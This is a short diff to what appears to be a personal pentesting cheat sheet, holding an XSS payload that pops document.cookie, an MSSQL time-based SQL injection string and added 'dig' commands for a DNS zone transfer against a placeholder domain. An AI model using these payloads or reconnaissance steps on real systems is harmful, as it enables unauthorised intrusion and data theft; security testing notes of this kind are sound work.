@@ -11,3 +11,6 @@ grep -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" -r wudawei --color=auto
 +"+onmouseover="alert(document.cookie)"><!--   xss
 
 '; waitfor delay '0:0:6' --               msql inj
+---------------------------------------------------------------------------------------
+dig axfr @ns1.target.com target.com
+dig ns target.com
